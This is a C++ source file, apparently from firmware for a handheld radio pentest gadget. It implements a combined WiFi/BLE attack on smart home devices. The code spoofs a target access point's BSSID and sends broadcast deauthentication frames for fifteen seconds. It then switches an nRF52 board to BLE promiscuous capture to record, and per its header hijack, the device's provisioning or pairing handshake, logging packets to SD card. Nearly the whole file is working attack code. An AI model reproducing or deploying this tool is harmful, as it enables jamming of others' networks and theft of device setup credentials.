/*
 * nrf52_wifi_ble_combo.cpp — WiFi + BLE Coordinated Attack.
 *
 * STRATEGY:
 *   1. ESP32 deauths a smart home device off its WiFi network
 *   2. Device falls back to BLE provisioning/pairing mode
 *   3. nRF52 is already listening to capture the BLE provisioning
 *      handshake or hijack the setup process
 *
 * This is uniquely POSEIDON — no other handheld can deauth WiFi
 * and immediately attack BLE fallback on the same target.
 *
 * NeoPixel: COMBO_DEAUTH (red strobe) → COMBO_WAIT (amber pulse) →
 *           COMBO_CAPTURE (gold burst)
 */
#include "../app.h"
#include "../ui.h"
#include "../input.h"
#include "../theme.h"
#include "../sfx.h"
#include "../radio.h"
#include "../nrf52_hw.h"
#include "../nrf52_led.h"
#include "../sd_helper.h"
#include "../wifi_types.h"
#include "wifi_deauth_frame.h"
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

static bool ensure_feather(void) {
    if (NRF52Hardware::is_up()) return true;
    ui_clear_body(); auto &d = M5Cardputer.Display;
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+10);
    d.print("Connecting to Feather...");
    if (NRF52Hardware::begin()) { ui_toast("nRF52 OK", T_GOOD, 600); return true; }
    d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+24);
    d.print("Feather not found."); d.setCursor(4, BODY_Y+38);
    d.setTextColor(T_DIM, T_BG); d.print("G3=TX G4=RX 3V3 GND");
    ui_draw_footer("ESC=back");
    while (true) { uint16_t k = input_poll(); if (k != PK_NONE) return false; delay(40); }
}

static bool parse_mac(const char *s, uint8_t out[6]) {
    int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return false;
    for (int i = 0; i < 6; ++i) { if (v[i]<0||v[i]>0xFF) return false; out[i]=(uint8_t)v[i]; }
    return true;
}

void feat_nrf52_wifi_ble_combo(void)
{
    if (!ensure_feather()) return;

    auto &d = M5Cardputer.Display;
    uint8_t target_bssid[6];
    uint8_t channel = 1;
    char ssid[33] = "";

    /* Get target — from wifi scan or manual entry */
    if (g_last_selected_valid) {
        memcpy(target_bssid, g_last_selected_ap.bssid, 6);
        channel = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
        strncpy(ssid, g_last_selected_ap.ssid, sizeof(ssid)-1);
    } else {
        char mac_buf[24];
        if (!input_line("Target BSSID:", mac_buf, sizeof(mac_buf))) return;
        if (!parse_mac(mac_buf, target_bssid)) { ui_toast("bad MAC", T_BAD, 1000); return; }
        char ch_buf[6];
        if (!input_line("Channel (1-13):", ch_buf, sizeof(ch_buf))) return;
        int ch = atoi(ch_buf); if (ch < 1 || ch > 13) { ui_toast("bad ch", T_BAD, 1000); return; }
        channel = (uint8_t)ch;
        snprintf(ssid, sizeof(ssid), "%02X:%02X:%02X", target_bssid[3], target_bssid[4], target_bssid[5]);
    }

    /* =========================================
     * PHASE 1: WiFi Deauth — kick device off AP
     * ========================================= */
    nrf52_led_set(NRF52_LED_COMBO_DEAUTH);
    sfx_deauth_burst();

    radio_switch(RADIO_WIFI);
    wifi_lean_sta_init();   /* raw-safe STA init (ensures driver is up); wifi_silent_ap_begin
                             * only sets mode, so keep a real init here like deauth does. */
    wifi_silent_ap_set_source_mac(target_bssid);
    esp_err_t ap_rc = wifi_silent_ap_begin(channel);
    Serial.printf("[combo] deauth phase ch=%u rc=%d\n", channel, (int)ap_rc);

    ui_clear_body();
    ui_draw_status("Combo", "deauth");
    d.setTextColor(T_BAD, T_BG); d.setCursor(4, BODY_Y+2);
    d.printf("PHASE 1: DEAUTH %s", ssid);
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_BAD);
    ui_draw_footer("ESC=abort SPACE=skip to BLE");

    uint16_t seq = (uint16_t)(esp_random() & 0x0FFF);
    uint32_t deauth_start = millis();
    uint32_t sent = 0;
    uint32_t deauth_duration_ms = 15000; /* 15s of deauth then move to BLE */
    bool aborted = false;
    bool skipped = false;
    uint32_t last_draw = 0;

    while (millis() - deauth_start < deauth_duration_ms && !aborted && !skipped) {
        /* Fire broadcast deauth bursts */
        for (int i = 0; i < 8; ++i) {
            int ok = wifi_deauth_broadcast(target_bssid, &seq);
            sent += ok;
            delay(3);
        }

        /* Update display every 250ms */
        if (millis() - last_draw > 250) {
            last_draw = millis();
            ui_dashboard_chrome(">> DEAUTH <<", (sent % 16 == 0));
            d.fillRect(0, BODY_Y+16, SCR_W, 40, T_BG);
            d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+18);
            d.printf("Frames: %lu", (unsigned long)sent);
            uint32_t remain = (deauth_duration_ms - (millis() - deauth_start)) / 1000;
            d.setTextColor(T_WARN, T_BG); d.setCursor(4, BODY_Y+30);
            d.printf("BLE phase in %lus", (unsigned long)remain);
            ui_freq_bars(SCR_W-70, BODY_Y+16, 4, 30);
        }

        uint16_t k = input_poll();
        if (k == PK_ESC) aborted = true;
        if (k == PK_SPACE) skipped = true;
    }

    wifi_silent_ap_end();
    wifi_silent_ap_set_source_mac(nullptr);

    if (aborted) { nrf52_led_set(NRF52_LED_IDLE); return; }

    /* =============================================
     * PHASE 2: BLE Provisioning Capture via nRF52
     * ============================================= */
    nrf52_led_set(NRF52_LED_COMBO_WAIT);
    sfx_scan_start();

    /* Tell nRF52 to start BLE promiscuous capture */
    String resp;
    NRF52Hardware::send_command("BLE_PROMISC", resp, 1000);

    ui_clear_body();
    ui_draw_status("Combo", "BLE wait");
    d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+2);
    d.print("PHASE 2: BLE CAPTURE");
    d.drawFastHLine(4, BODY_Y+12, SCR_W-8, T_ACCENT2);
    d.setTextColor(T_DIM, T_BG); d.setCursor(4, BODY_Y+16);
    d.print("Waiting for BLE provisioning...");
    d.setCursor(4, BODY_Y+28);
    d.printf("Target was deauthed from %s", ssid);
    ui_draw_footer("ESC=stop S=save");

    /* Open log file */
    File log_file = sdlog_open("combo_ble", "ts,type,data");
    uint32_t ble_pkts = 0;
    uint32_t prov_found = 0;
    last_draw = 0;

    while (true) {
        while (NRF52Hardware::available()) {
            String line = NRF52Hardware::read_line();

            if (line.startsWith("PKT:") || line.startsWith("PROV:") ||
                line.startsWith("PAIR:")) {
                ble_pkts++;
                if (log_file) log_file.printf("%lu,%s\n", (unsigned long)millis(), line.c_str());

                /* Provisioning/pairing activity detected! */
                if (line.startsWith("PROV:") || line.startsWith("PAIR:")) {
                    prov_found++;
                    nrf52_led_set(NRF52_LED_COMBO_CAPTURE);
                    nrf52_led_oneshot(NRF52_LED_CAPTURE, NRF52_LED_COMBO_CAPTURE, 2000);
                    sfx_capture();
                }

                if (millis() - last_draw > 200) {
                    last_draw = millis();
                    d.fillRect(0, BODY_Y+36, SCR_W, 56, T_BG);
                    d.setTextColor(T_GOOD, T_BG); d.setCursor(4, BODY_Y+38);
                    d.printf("BLE pkts: %lu", (unsigned long)ble_pkts);

                    if (prov_found > 0) {
                        d.setTextColor(T_ACCENT, T_BG); d.setCursor(4, BODY_Y+50);
                        d.printf("PROVISIONING: %lu!", (unsigned long)prov_found);
                    }

                    d.setTextColor(T_DIM, T_BG); d.setCursor(4, BODY_Y+64);
                    String snippet = line.substring(0, min((int)line.length(), 36));
                    d.print(snippet);

                    /* Animated elements */
                    ui_hexstream(4, BODY_Y+78, SCR_W-8, 10, T_ACCENT);
                }
            }
        }

        /* Radar sweep while waiting */
        ui_radar(SCR_W-18, BODY_Y+10, 8, T_ACCENT);

        uint16_t k = input_poll();
        if (k == PK_ESC) break;
        if ((k == 's' || k == 'S') && log_file) {
            log_file.flush();
            nrf52_led_oneshot(NRF52_LED_CAPTURE, NRF52_LED_COMBO_CAPTURE, 1500);
            ui_toast("Saved to SD", T_GOOD, 800);
        }
        delay(10);
    }

    NRF52Hardware::send_command("STOP", resp, 500);
    if (log_file) log_file.close();
    nrf52_led_set(NRF52_LED_IDLE);
}
